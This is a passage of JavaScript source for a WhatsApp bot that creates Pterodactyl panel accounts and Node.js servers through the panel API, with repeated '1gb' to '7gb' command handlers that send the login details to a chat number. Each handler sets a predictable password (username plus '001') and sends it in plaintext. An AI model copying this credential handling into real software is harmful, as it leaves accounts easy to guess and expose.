    m.reply(`Use commands ${prefix}listusr ${res.meta.pagination.current_page + 1} to see the next page.`);
  }
}}
break;
case '1gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
 l🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:

 ${domain}

╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐒𝐄𝐍𝐓 𝐓𝐎 𝐍𝐔𝐌𝐁𝐄𝐑*
┃🪀𝐈𝐃: ${user.id}
┃🪀𝐌𝐄𝐌𝐎𝐑𝐘: ${server.limits.memory === 0 ? '𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃' : server.limits.memory} 
╰ *𝐒𝐇𝐀𝐃Ø𝐖-𝐗𝐌𝐃-𝐕𝟏*
> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧')
}

}
}
break
case '2gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "2070"
let cpu = "60"
let disk = "2070"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:

 ${domain}

╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐒𝐄𝐍𝐓 𝐓𝐎 𝐍𝐔𝐌𝐁𝐄𝐑*
┃🪀𝐈𝐃: ${user.id}
┃🪀𝐌𝐄𝐌𝐎𝐑𝐘: ${server.limits.memory === 0 ? '𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃' : server.limits.memory} 
╰ *𝐒𝐇𝐀𝐃Ø𝐖-𝐗𝐌𝐃-𝐕𝟏*
> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧')
}
}
}
break
case '3gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "3090"
let cpu = "90"
let disk = "3090"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:

 ${domain}

╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:

 ${domain}

╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('yeah, failed sɪʀ...\n_Please check your hydroelectric and pltc fires_')
}
}
}
break
case '4gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "4110"
let cpu = "120"
let disk = "4110"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:
 ${domain}
╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𓊈SENT TO NUMBER𓊉*
┃❍ɪᴅ: ${user.id}
┃❍ᴍᴇᴍᴏʀʏ: ${server.limits.memory === 0 ? 'ᴜɴʟɪᴍɪᴛᴇᴅ' : server.limits.memory} 
╰𓊈 *SPARK MD V1* 𓊉 
> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴠᴏʟᴛᴀɢᴇ ʟᴏʀᴅ ᴅᴇᴠ
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧')
}
}}

break
case '5gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "5130"
let cpu = "150"
let disk = "5130"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:

 ${domain}

╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐒𝐄𝐍𝐓 𝐓𝐎 𝐍𝐔𝐌𝐁𝐄𝐑*
┃🪀𝐈𝐃: ${user.id}
┃🪀𝐌𝐄𝐌𝐎𝐑𝐘: ${server.limits.memory === 0 ? '𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃' : server.limits.memory} 
╰ *𝐒𝐇𝐀𝐃Ø𝐖-𝐗𝐌𝐃-𝐕𝟏*
> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧')
}
}
}
break
case '6gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "6050"
let cpu = "180"
let disk = "6050"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `
╭ *𝐇𝐄𝐋𝐋𝐎 @${u.split`@`[0]}*
┃🪀𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄: ${user.username}
┃🪀𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ${password}
╰🪀𝐋𝐎𝐆𝐈𝐍:

 ${domain}

╭ *𝐍𝐎𝐓𝐄:*
> 𝐎𝐖𝐍𝐄𝐑 𝐎𝐍𝐋𝐘 𝐒𝐄𝐍𝐃𝐒 𝟏𝐗 𝐃𝐀𝐓𝐀 
> 𝐏𝐋𝐄𝐀𝐒𝐄 𝐒𝐀𝐕𝐄 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓
> 𝐖𝐎𝐍𝐓 𝐑𝐄𝐒𝐄𝐍𝐃 𝐘𝐎𝐔𝐑 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
> 𝟏𝟎 𝐃𝐀𝐘𝐒 𝐆𝐔𝐀𝐑𝐀𝐍𝐓𝐄𝐄
╰𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑`
LordVoltage.sendMessage(u, { caption: ctf, image: fs.readFileSync("./data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_23",
"startup": "if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi;  if [[ ! -z \${CUSTOM_ENVIRONMENT_VARIABLES} ]]; then      vars=\$(echo \${CUSTOM_ENVIRONMENT_VARIABLES} | tr \";\" \"\n\");      for line in \$vars;     do export \$line;     done fi;  /usr/local/bin/\${CMD_RUN};",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
╭ *𝐒𝐄𝐍𝐓 𝐓𝐎 𝐍𝐔𝐌𝐁𝐄𝐑*
┃🪀𝐈𝐃: ${user.id}
┃🪀𝐌𝐄𝐌𝐎𝐑𝐘: ${server.limits.memory === 0 ? '𝐔𝐍𝐋𝐈𝐌𝐈𝐓𝐄𝐃' : server.limits.memory} 
╰ *𝐒𝐇𝐀𝐃Ø𝐖-𝐗𝐌𝐃-𝐕𝟏*
> 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐅𝐀𝐌𝐎𝐔𝐒 𝐃𝐄𝐕 👑
`)
} catch {
  reply('failed,\n_please check your hydroelectric and pltc fires_ Type .tutorial to learn\n> POWERED BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧')
}
}
}
break
case '7gb': {if (prefix === '.') {
if (!DanzTheCreator && !isPrem) return reply(mess.only.premium)
let t = text.split(',');
if (t.length < 2) return reply(`*Incorrect format!*
Use:
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "7050"
let cpu = "210"
let disk = "7050"
let email = username + "famous@gmail.com"
try {
if (!u) return
let d = (await LordVoltage.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
